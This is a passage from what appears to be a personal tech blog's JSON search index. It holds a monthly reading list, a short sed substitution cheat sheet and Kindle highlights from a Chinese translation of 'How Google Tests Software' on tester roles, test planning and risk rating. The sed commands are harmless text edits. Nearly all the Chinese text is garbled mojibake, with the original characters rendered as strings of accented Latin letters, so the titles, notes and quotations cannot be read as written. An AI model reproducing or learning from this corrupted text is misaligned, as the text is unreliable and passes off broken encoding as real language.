ã€‹100% 7æœˆä¹¦å• ã€Šé³—é±¼çš„æ—…è¡Œã€‹ ã€Šè½¯ä»¶æµ‹è¯•ä¹‹é“å¾®è½¯æŠ€æœ¯ä¸“å®¶ç»éªŒæ€»ç»“ã€‹ [KU]ã€Šä¸€ä¸ªäººçš„æœåœ£ã€‹ [KU]ã€Šç»æµå­¦é€šè¯†è¯¾ã€‹ new æ°´æµ’ä¼  [KU] new å›´åŸ [KU] new é»„é‡‘æ—¶ä»£ new é•¿å®‰åäºŒæ—¶è¾° [KU] new å¹»å¤œ new è½¯ä»¶å¼€å‘æœ¬è´¨è®º [KU] new è‹ä¸œå¡ä¼  [KU] new è¯¡è®¡åšç‰©é¦† [KU] new å¤§å¸ˆçš„ç››å®´ äºŒåä¸–çºªæœ€ä½³ç§‘å¹»å°è¯´ [KU] new æ´»å‡ºç”Ÿå‘½çš„æ„ä¹‰ ","permalink":"https://wdd.js.org/posts/2021/07/ou9o92/","summary":"6æœˆä¹¦å•å›é¡¾ ã€Šé³—é±¼çš„æ—…è¡Œã€‹åˆšè¯»åˆ°92% ã€ŠGooglerè½¯ä»¶æµ‹è¯•ä¹‹é“ã€‹100% ã€Šè½¯ä»¶æµ‹è¯•ä¹‹é“å¾®è½¯æŠ€æœ¯ä¸“å®¶ç»éªŒæ€»ç»“ã€‹24% ã€Šæ²‰é»˜çš„ç—…äººã€‹100% ã€Šä¸€ä¸ªäººçš„æœåœ£ã€‹9% ã€Šè¯»æ‡‚å‘ç¥¨ã€‹100% ã€Š108ä¸ªè®­ç»ƒè®©ä½ æˆä¸ºæ‰‹æœºæ‘„å½±è¾¾äººã€‹100% ã€Šç»æµå­¦é€šè¯†è¯¾ã€‹5% ã€Šæ¥šç•™é¦™æ–°ä¼ ã€‹100% 7æœˆä¹¦å• ã€Šé³—é±¼çš„æ—…è¡Œã€‹ ã€Šè½¯ä»¶æµ‹è¯•ä¹‹é“å¾®è½¯æŠ€æœ¯ä¸“å®¶ç»éªŒæ€»ç»“ã€‹ [KU]ã€Šä¸€ä¸ªäººçš„æœåœ£ã€‹ [KU]ã€Šç»æµå­¦é€šè¯†è¯¾ã€‹ new æ°´æµ’ä¼  [KU] new å›´åŸ [KU] new é»„é‡‘æ—¶ä»£ new é•¿å®‰åäºŒæ—¶è¾° [KU] new å¹»å¤œ new è½¯ä»¶å¼€å‘æœ¬è´¨è®º [KU] new è‹ä¸œå¡ä¼  [KU] new è¯¡è®¡åšç‰©é¦† [KU] new å¤§å¸ˆçš„ç››å®´ äºŒåä¸–çºªæœ€ä½³ç§‘å¹»å°è¯´ [KU] new æ´»å‡ºç”Ÿå‘½çš„æ„ä¹‰ ","title":"7æœˆä¹¦å•"},{"content":"ç›´æ¥åœ¨åŸæ–‡çš„åŸºç¡€ä¸Šä¿®æ”¹ sed -i \u0026#39;s/ABC/abc/g\u0026#39; some.txt å¤šæ¬¡æ›¿æ¢ æ–¹æ¡ˆ 1 ä½¿ç”¨åˆ†å· sed \u0026#39;s/ABC/abc/g;s/DEF/def/g\u0026#39; some.txt æ–¹æ¡ˆ 2 å¤šæ¬¡ä½¿ç”¨-e sed -e \u0026#39;s/ABC/abc/g\u0026#39; -e \u0026#39;s/DEF/def/g\u0026#39; some.txt è½¬è¯‘/ å¦‚æœæ›¿æ¢æˆ–è€…è¢«æ›¿æ¢çš„å­—ç¬¦ä¸­æœ¬æ¥å°±æœ‰/, é‚£ä¹ˆæ›¿æ¢å°±ä¼šæ— æ³•è¾¾åˆ°é¢„æœŸæ•ˆæœï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–çš„å­—ç¬¦æ¥æ›¿ä»£/ã€‚\nThe / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \\ character. https://www.gnu.org/software/sed/manual/sed.html\n# å¯ä»¥ç”¨#æ¥æ›¿ä»£/ sed \u0026#39;s#ABC#de/#g\u0026#39; some.txt # ä¹Ÿå¯ä»¥ç”¨?æ¥æ›¿ä»£/ sed \u0026#39;s?ABC?de#?g\u0026#39; some.txt æ›¿ä»£çš„ç›®æ ‡ä¸­åŒ…å«å˜é‡ # æ³¨æ„è¿™é‡Œç”¨çš„æ˜¯åŒå¼•å·ï¼Œå†…éƒ¨çš„å˜é‡ä¼šè¢«è½¬ä¹‰ sed \u0026#34;s#ABC#${TODAY}#g\u0026#34; some.txt å‚è€ƒ https://www.gnu.org/software/sed/manual/sed.html ","permalink":"https://wdd.js.org/shell/sed-tips/","summary":"ç›´æ¥åœ¨åŸæ–‡çš„åŸºç¡€ä¸Šä¿®æ”¹ sed -i \u0026#39;s/ABC/abc/g\u0026#39; some.txt å¤šæ¬¡æ›¿æ¢ æ–¹æ¡ˆ 1 ä½¿ç”¨åˆ†å· sed \u0026#39;s/ABC/abc/g;s/DEF/def/g\u0026#39; some.txt æ–¹æ¡ˆ 2 å¤šæ¬¡ä½¿ç”¨-e sed -e \u0026#39;s/ABC/abc/g\u0026#39; -e \u0026#39;s/DEF/def/g\u0026#39; some.txt è½¬è¯‘/ å¦‚æœæ›¿æ¢æˆ–è€…è¢«æ›¿æ¢çš„å­—ç¬¦ä¸­æœ¬æ¥å°±æœ‰/, é‚£ä¹ˆæ›¿æ¢å°±ä¼šæ— æ³•è¾¾åˆ°é¢„æœŸæ•ˆæœï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–çš„å­—ç¬¦æ¥æ›¿ä»£/ã€‚\nThe / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \\ character. https://www.gnu.org/software/sed/manual/sed.html","title":"sedæ›¿æ¢"},{"content":"Googleè½¯ä»¶æµ‹è¯•ä¹‹é“ï¼ˆå¼‚æ­¥å›¾ä¹¦ï¼‰James Whittaker; Jason Arbon; Jeff Carollo\nåºæ ‡æ³¨(é»„è‰²) - ä½ç½® 361ä»æ ¹æœ¬ä¸Šè¯´ï¼Œå¦‚æœæµ‹è¯•äººå‘˜æƒ³åŠ å…¥è¿™ä¸ªä¿±ä¹éƒ¨ï¼Œå°±å¿…é¡»å…·å¤‡è‰¯å¥½çš„è®¡ç®—æœºç§‘å­¦åŸºç¡€å’Œç¼–ç¨‹èƒ½åŠ›ã€‚å˜é©æ ‡æ³¨(é»„è‰²) - ä½ç½® 367æ‹›è˜å…·å¤‡å¼€å‘èƒ½åŠ›çš„æµ‹è¯•äººå‘˜å¾ˆéš¾ï¼Œæ‰¾åˆ°æ‡‚æµ‹è¯•çš„å¼€å‘äººå‘˜å°±æ›´éš¾ï¼Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 368ä½†æ˜¯ç»´æŒç°çŠ¶æ›´è¦å‘½ï¼Œæˆ‘åªèƒ½å¾€å‰èµ°ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 388æˆ‘ä»¬å¯»æ‰¾çš„äººè¦å…¼å…·å¼€å‘äººå‘˜çš„æŠ€èƒ½å’Œæµ‹è¯•äººå‘˜çš„æ€ç»´ï¼Œä»–ä»¬å¿…é¡»ä¼šç¼–ç¨‹ï¼Œèƒ½å®ç°å·¥å…·ã€å¹³å°å’Œæµ‹è¯•è‡ªåŠ¨åŒ–ã€‚ç¬¬1ç«  Googleè½¯ä»¶æµ‹è¯•ä»‹ç»æ ‡æ³¨(é»„è‰²) - 1.1 è´¨é‡ä¸ç­‰äºæµ‹è¯• \u0026gt; ä½ç½® 573Googleèƒ½ç”¨å¦‚æ­¤å°‘çš„ä¸“èŒæµ‹è¯•äººå‘˜çš„åŸå› ï¼Œå°±æ˜¯å¼€å‘å¯¹è´¨é‡çš„è´Ÿè´£ã€‚æ ‡æ³¨(é»„è‰²) - 1.1 è´¨é‡ä¸ç­‰äºæµ‹è¯• \u0026gt; ä½ç½® 574å¦‚æœæŸä¸ªäº§å“å‡ºäº†é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªè·³å‡ºæ¥çš„è‚¯å®šæ˜¯å¯¼è‡´è¿™ä¸ªé—®é¢˜å‘ç”Ÿçš„å¼€å‘äººå‘˜ï¼Œè€Œä¸æ˜¯é—æ¼è¿™ä¸ª bugçš„æµ‹è¯•äººå‘˜ã€‚æ ‡æ³¨(é»„è‰²) - 1.2.1 è½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆï¼ˆSWEï¼‰ \u0026gt; ä½ç½® 593è½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆï¼ˆæ ‡æ³¨(é»„è‰²) - 1.2.2 è½¯ä»¶æµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆï¼ˆSETï¼‰ \u0026gt; ä½ç½® 600è½¯ä»¶æµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆï¼ˆæ ‡æ³¨(é»„è‰²) - 1.2.3 æµ‹è¯•å·¥ç¨‹å¸ˆï¼ˆTEï¼‰ \u0026gt; ä½ç½® 612TEæŠŠç”¨æˆ·æ”¾åœ¨ç¬¬ä¸€ä½æ¥æ€è€ƒã€‚ TEç»„ç»‡æ•´ä½“è´¨é‡å®è·µï¼Œåˆ†æè§£é‡Šæµ‹è¯•è¿è¡Œç»“æœï¼Œç¬¬2ç«  è½¯ä»¶æµ‹è¯•å¼€å‘å·¥ç¨‹å¸ˆä¹¦ç­¾ - ä½ç½® 784æ ‡æ³¨(é»„è‰²) - ä½ç½® 787Googleçš„ SWEæ˜¯åŠŸèƒ½å¼€å‘äººå‘˜ï¼› Googleçš„ SETæ˜¯æµ‹è¯•å¼€å‘äººå‘˜ï¼› Googleçš„ TEæ˜¯ç”¨æˆ·å¼€å‘äººå‘˜ã€‚æ ‡æ³¨(é»„è‰²) - 2.1.1 å¼€å‘å’Œæµ‹è¯•æµç¨‹ \u0026gt; ä½ç½® 864æµ‹è¯•é©±åŠ¨å¼€å‘â€æ ‡æ³¨(é»„è‰²) - 2.1.3 é¡¹ç›®çš„æ—©æœŸé˜¶æ®µ \u0026gt; ä½ç½® 908ä¸€ä¸ªäº§å“å¦‚æœåœ¨æ¦‚å¿µä¸Šè¿˜æ²¡æœ‰å®Œå…¨ç¡®å®šæˆå‹æ—¶å°±å»å…³å¿ƒè´¨é‡ï¼Œè¿™å°±æ˜¯ä¼˜å…ˆçº§æ··ä¹±çš„è¡¨ç°ã€‚æ ‡æ³¨(é»„è‰²) - 2.1.14 æµ‹è¯•è¿è¡Œè¦æ±‚ \u0026gt; ä½ç½® 1398æ¯ä¸ªæµ‹è¯•å’Œå…¶ä»–æµ‹è¯•ä¹‹é—´éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œä½¿å®ƒä»¬å°±èƒ½å¤Ÿä»¥ä»»æ„é¡ºåºæ¥æ‰§è¡Œã€‚æ ‡æ³¨(é»„è‰²) - 2.1.14 æµ‹è¯•è¿è¡Œè¦æ±‚ \u0026gt; ä½ç½® 1399æµ‹è¯•ä¸åšä»»ä½•æ•°æ®æŒä¹…åŒ–æ–¹é¢çš„å·¥ä½œã€‚æ ‡æ³¨(é»„è‰²) - 2.1.14 æµ‹è¯•è¿è¡Œè¦æ±‚ \u0026gt; ä½ç½® 1400åœ¨è¿™äº›æµ‹è¯•ç”¨ä¾‹ç¦»å¼€æµ‹è¯•ç¯å¢ƒçš„æ—¶å€™ï¼Œè¦ä¿è¯æµ‹è¯•ç¯å¢ƒçš„çŠ¶æ€ä¸æµ‹è¯•ç”¨ä¾‹å¼€å§‹æ‰§è¡Œä¹‹å‰çš„çŠ¶æ€æ˜¯ä¸€æ ·çš„ã€‚æ ‡æ³¨(é»„è‰²) - 2.1.14 æµ‹è¯•è¿è¡Œè¦æ±‚ \u0026gt; ä½ç½® 1404æ€»ä¹‹ï¼Œâ€œä»»æ„é¡ºåºâ€æ„å‘³ç€å¯ä»¥å¹¶å‘æ‰§è¡Œç”¨ä¾‹ã€‚æ ‡æ³¨(é»„è‰²) - 2.3 SETçš„æ‹›è˜ \u0026gt; ä½ç½® 1650åœ¨ä¸€äº›æ£˜æ‰‹çš„ç¼–ç é—®é¢˜æˆ–åŠŸèƒ½çš„æ­£ç¡®æ€§ä¸Šæµªè´¹æ—¶é—´ï¼Œä¸å¦‚è€ƒæ ¸ä»–ä»¬æ˜¯å¦‚ä½•çœ‹å¾…ç¼–ç å’Œè´¨é‡çš„ã€‚æ ‡æ³¨(é»„è‰²) - 2.3 SETçš„æ‹›è˜ \u0026gt; ä½ç½® 1727æµ‹è¯•ä¸åº”æ˜¯è¢«è¦æ±‚äº†æ‰å»åšçš„äº‹æƒ…ã€‚æ ‡æ³¨(é»„è‰²) - 2.3 SETçš„æ‹›è˜ \u0026gt; ä½ç½® 1728ç¨‹åºçš„ç¨³å®šæ€§å’ŒéŸ§æ€§æ¯”åŠŸèƒ½æ­£ç¡®è¦é‡è¦çš„å¤šã€‚æ ‡æ³¨(é»„è‰²) - 2.4 ä¸å·¥å…·å¼€å‘å·¥ç¨‹å¸ˆTed Maoçš„è®¿è°ˆ \u0026gt; ä½ç½® 1796è¦å…è®¸ä»–ä»¬ä½¿ç”¨ä½ æ— æ³•é¢„æ–™çš„æ–¹å¼æ¥ä½¿ç”¨ä½ çš„å·¥å…·ã€‚æ ‡æ³¨(é»„è‰²) - 2.5 ä¸Web Driverçš„åˆ›å»ºè€…Simon Stewartçš„å¯¹è¯ \u0026gt; ä½ç½® 1845æˆ‘ä½¿ç”¨äº†ä¸€ä¸ªè¢«ç§°ä¸º DDDï¼ˆè¯‘æ³¨ï¼š defect-driven developmentï¼‰çš„æµç¨‹ï¼Œç¼ºé™·é©±åŠ¨å¼€å‘ã€‚æ ‡æ³¨(é»„è‰²) - 2.5 ä¸Web Driverçš„åˆ›å»ºè€…Simon Stewartçš„å¯¹è¯ \u0026gt; ä½ç½® 1859Chromeåœ¨ä½¿ç”¨ PyAutoï¼Œç¬¬3ç«  æµ‹è¯•å·¥ç¨‹å¸ˆæ ‡æ³¨(é»„è‰²) - 3.1 ä¸€ç§é¢å‘ç”¨æˆ·çš„æµ‹è¯•è§’è‰² \u0026gt; ä½ç½® 1879æˆ‘ä»¬è¯´ TEæ˜¯ä¸€ç§â€œç”¨æˆ·å¼€å‘è€…ï¼ˆ user-developerï¼‰â€ï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªå®¹æ˜“ç†è§£çš„æ¦‚å¿µã€‚æ ‡æ³¨(é»„è‰²) - 3.1 ä¸€ç§é¢å‘ç”¨æˆ·çš„æµ‹è¯•è§’è‰² \u0026gt; ä½ç½® 1880å¯¹äºç¼–ç çš„æ•¬æ„æ˜¯å…¬å¸æ–‡åŒ–ä¸­ç›¸å½“é‡è¦çš„ä¸€ç‚¹ã€‚æ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1903åœ¨ç ”å‘çš„æ—©æœŸé˜¶æ®µï¼ŒåŠŸèƒ½è¿˜åœ¨ä¸æ–­å˜åŒ–ï¼Œæœ€ç»ˆåŠŸèƒ½åˆ—è¡¨å’ŒèŒƒç•´è¿˜æ²¡æœ‰ç¡®å®šï¼Œ TEé€šå¸¸æ²¡æœ‰å¤ªå¤šçš„å·¥ä½œå¯åšã€‚æ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1904ç»™ä¸€ä¸ªé¡¹ç›®é…å¤‡å¤šå°‘æµ‹è¯•äººå‘˜ï¼Œå–å†³äºé¡¹ç›®é£é™©å’ŒæŠ•èµ„å›æŠ¥ç‡ã€‚æ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1906æˆ‘ä»¬éœ€è¦åœ¨æ­£ç¡®çš„æ—¶é—´ï¼ŒæŠ•å…¥æ­£ç¡®æ•°é‡çš„ TEï¼Œå¹¶å¸¦æ¥è¶³å¤Ÿçš„ä»·å€¼ã€‚æ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1908å½“å‰è½¯ä»¶çš„è–„å¼±ç‚¹åœ¨å“ªé‡Œï¼Ÿæ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1909æœ‰æ²¡æœ‰å®‰å…¨ã€éšç§ã€æ€§èƒ½ã€å¯é æ€§ã€å¯ç”¨æ€§ã€æ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1910ä¸»è¦ç”¨æˆ·åœºæ™¯æ˜¯å¦åŠŸèƒ½æ­£å¸¸ï¼Ÿæ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1911å½“å‘ç”Ÿé—®é¢˜çš„æ—¶å€™ï¼Œæ˜¯å¦å®¹æ˜“è¯Šæ–­é—®é¢˜æ‰€åœ¨ï¼Ÿæ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1914TEçš„æ ¹æœ¬ä½¿å‘½æ˜¯ä¿æŠ¤ç”¨æˆ·å’Œä¸šåŠ¡çš„åˆ©ç›Šï¼Œä½¿ä¹‹ä¸å—åˆ°ç³Ÿç³•çš„è®¾è®¡ã€ä»¤äººå›°æƒ‘çš„ç”¨æˆ·ä½“éªŒã€æ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1921TEæ“…é•¿å‘ç°éœ€æ±‚ä¸­çš„æ¨¡ç³Šä¹‹å¤„ï¼Œæ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1924TEé€šå¸¸æ˜¯å›¢é˜Ÿé‡Œæœ€å‡ºåçš„äººï¼Œå› ä¸ºä»–ä»¬éœ€è¦ä¸å„ç§è§’è‰²æ ‡æ³¨(é»„è‰²) - 3.2 æµ‹è¯•å·¥ç¨‹å¸ˆçš„å·¥ä½œ \u0026gt; ä½ç½® 1938ä¸‹é¢æ˜¯æˆ‘ä»¬å…³äº TEèŒè´£çš„ä¸€èˆ¬æ€§æè¿°ã€‚æµ‹è¯•è®¡åˆ’å’Œé£é™©åˆ†æã€‚è¯„å®¡éœ€æ±‚ã€è®¾è®¡ã€ä»£ç å’Œæµ‹è¯•ã€‚æ¢ç´¢å¼æµ‹è¯•ã€‚ç”¨æˆ·åœºæ™¯ã€‚ç¼–å†™æµ‹è¯•ç”¨ä¾‹ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 1949å¦‚æœè½¯ä»¶æ·±å—äººä»¬å–œçˆ±ï¼Œå¤§å®¶å°±ä¼šè®¤ä¸ºæµ‹è¯•æ‰€ä½œæ‰€ä¸ºæ˜¯ç†æ‰€åº”å½“çš„ï¼›å¦‚æœè½¯ä»¶å¾ˆç³Ÿç³•ï¼Œäººä»¬å¯èƒ½å°±ä¼šè´¨ç–‘æµ‹è¯•å·¥ä½œã€‚ç¬”è®° - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 1950æµ‹è¯•èƒŒé”…æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 1990è¯»è€…å¯ä»¥ç”¨â€œ Google Test Analyticsâ€å…³é”®è¯æœç´¢åˆ°è¿™ä¸ªå·¥å…·ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 1991é¿å…æ•£æ¼«çš„æ–‡å­—ï¼Œæ¨èä½¿ç”¨ç®€æ˜çš„åˆ—è¡¨ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 1993ä¸å¿…æ¨é”€ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 1995ç®€æ´ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 1996ä¸è¦æŠŠä¸é‡è¦çš„ã€æ— æ³•æ‰§è¡Œçš„ä¸œè¥¿æ”¾è¿›æµ‹è¯•æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 1998æ¸è¿›å¼çš„æè¿°ï¼ˆ Make it flowï¼‰ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 2001æœ€ç»ˆç»“æœåº”è¯¥æ˜¯æµ‹è¯•ç”¨ä¾‹ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 20091. Aä»£è¡¨ç‰¹è´¨ï¼ˆ Attributeï¼‰æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 2010åœ¨å¼€å§‹æµ‹è¯•è®¡åˆ’æˆ–åš ACCåˆ†æçš„æ—¶å€™ï¼Œå¿…é¡»å…ˆç¡®å®šè¯¥äº§å“å¯¹ç”¨æˆ·ã€å¯¹ä¸šåŠ¡çš„æ„ä¹‰ã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦å¼€å‘è¿™ä¸ªä¸œè¥¿å‘¢ï¼Ÿå®ƒèƒ½å¸¦æ¥ä»€ä¹ˆæ ¸å¿ƒä»·å€¼ï¼Ÿå®ƒåˆé ä»€ä¹ˆæ¥å¸å¼•ç”¨æˆ·ï¼Ÿè®°ä½ï¼Œæ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 20462. Cä»£è¡¨ç»„ä»¶ï¼ˆ componentï¼‰ç»„ä»¶æ˜¯ç³»ç»Ÿçš„åè¯ï¼Œåœ¨ç‰¹è´¨è¢«è¯†åˆ«ä¹‹åç¡®å®šã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 2049ç»„ä»¶æ˜¯æ„æˆå¾…å»ºç³»ç»Ÿçš„æ¨¡å—ï¼Œæ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 20633. Cä»£è¡¨èƒ½åŠ›ï¼ˆ capabilityï¼‰èƒ½åŠ›æ˜¯ç³»ç»Ÿçš„åŠ¨è¯ï¼Œä»£è¡¨ç€ç³»ç»Ÿåœ¨ç”¨æˆ·æŒ‡ä»¤ä¹‹ä¸‹å®Œæˆçš„åŠ¨ä½œã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 2095èƒ½åŠ›æœ€é‡è¦çš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯å®ƒçš„å¯æµ‹è¯•æ€§ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 2098èƒ½åŠ›æœ€é‡è¦çš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯å®ƒçš„å¯æµ‹è¯•æ€§ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 2100ä¸€ä¸ªèƒ½åŠ›å¯ä»¥æè¿°ä»»æ„æ•°é‡çš„ç”¨ä¾‹ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 2130ç”¨ä¸€ç³»åˆ—èƒ½åŠ›æ¥æè¿°ç”¨æˆ·æ•…äº‹ï¼Œæ ‡æ³¨(é»„è‰²) - 3.2.1 æµ‹è¯•è®¡åˆ’ \u0026gt; ä½ç½® 2142ç¡®å®š Google +çš„ç‰¹è´¨ã€ç»„ä»¶å’Œèƒ½åŠ›ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2193é£é™©æ— å¤„ä¸åœ¨â€”â€”æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2202ç¡®å®šé£é™©çš„è¿‡ç¨‹ç§°ä¸ºé£é™©åˆ†æã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 22021.é£é™©åˆ†ææ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2204è¿™äº›äº‹ä»¶å‘ç”Ÿçš„å¯èƒ½æ€§æœ‰å¤šå¤§ï¼Ÿä¸€æ—¦å‘ç”Ÿï¼Œå¯¹å…¬å¸äº§ç”Ÿå¤šå¤§å½±å“ï¼Ÿä¸€æ—¦å‘ç”Ÿï¼Œå¯¹å®¢æˆ·äº§ç”Ÿå¤šå¤§å½±å“ï¼Ÿäº§å“å…·å¤‡ä»€ä¹ˆç¼“è§£æªæ–½ï¼Ÿæ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2206è¿™äº›ç¼“è§£æªæ–½æœ‰å¤šå¤§å¯èƒ½ä¼šå¤±è´¥ï¼Ÿå¤„ç†è¿™äº›å¤±è´¥çš„æˆæœ¬æœ‰å“ªäº›ï¼Ÿæ¢å¤è¿‡ç¨‹æœ‰å¤šå›°éš¾ï¼Ÿäº‹ä»¶æ˜¯ä¸€æ¬¡æ€§é—®é¢˜ï¼Œè¿˜æ˜¯ä¼šå†æ¬¡å‘ç”Ÿï¼Ÿå½±å“æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2209åœ¨ Googleï¼Œæˆ‘ä»¬ç¡®å®šäº†ä¸¤ä¸ªè¦ç´ ï¼šå¤±è´¥é¢‘ç‡ï¼ˆ frequency of failureï¼‰å’Œå½±å“ï¼ˆ impactï¼‰ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2214é£é™©å‘ç”Ÿé¢‘ç‡æœ‰ 4ä¸ªé¢„å®šä¹‰å€¼ã€‚ç½•è§ï¼ˆæ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2217å°‘è§ï¼ˆ seldomï¼‰ï¼šæ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2221å¶å°”ï¼ˆ occasionallyï¼‰ï¼šæ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2225å¸¸è§ï¼ˆ oftenï¼‰ï¼šæ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2229æµ‹è¯•äººå‘˜ç¡®å®šæ¯ä¸ªèƒ½åŠ›çš„æ•…éšœå‘ç”Ÿé¢‘ç‡ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2230ä¼°è®¡é£é™©å½±å“çš„æ–¹æ³•å¤§è‡´ç›¸åŒï¼Œä¹Ÿæ˜¯ä»å‡ ç§å¶æ•°å–å€¼ä¸­é€‰æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2231æœ€å°ï¼ˆ minimalï¼‰ï¼šç”¨æˆ·ç”šè‡³ä¸ä¼šæ³¨æ„åˆ°çš„é—®é¢˜ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2234ä¸€äº›ï¼ˆ someï¼‰ï¼šå¯èƒ½ä¼šæ‰“æ‰°åˆ°ç”¨æˆ·çš„é—®é¢˜ã€‚ä¸€æ—¦å‘ç”Ÿï¼Œé‡è¯•æˆ–æ¢å¤æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2237è¾ƒå¤§ï¼ˆ considerableï¼‰ï¼šæ•…éšœå¯¼è‡´æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2240æœ€å¤§ï¼ˆ maximalï¼‰ï¼šå‘ç”Ÿçš„æ•…éšœä¼šæ°¸ä¹…æ€§çš„æŸå®³äº§å“çš„å£°èª‰ï¼Œå¹¶å¯¼è‡´ç”¨æˆ·ä¸å†ä½¿ç”¨å®ƒã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2267é£é™©ä¸å¤§å¯èƒ½å½»åº•æ¶ˆé™¤ã€‚é©¾é©¶æœ‰é£é™©ï¼Œä½†æˆ‘ä»¬ä»ç„¶ä¼šå¼€è½¦å‡ºè¡Œï¼›æ—…æ¸¸æœ‰é£é™©ï¼Œä½†æˆ‘ä»¬å¹¶æ²¡æœ‰åœæ­¢æ—…æ¸¸ã€‚æ ‡æ³¨(é»„è‰²) - 3.2.2 é£é™© \u0026gt; ä½ç½® 2285åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼Œä»»ä½•ä¸€ç§å¯ä»¥åœ¨ 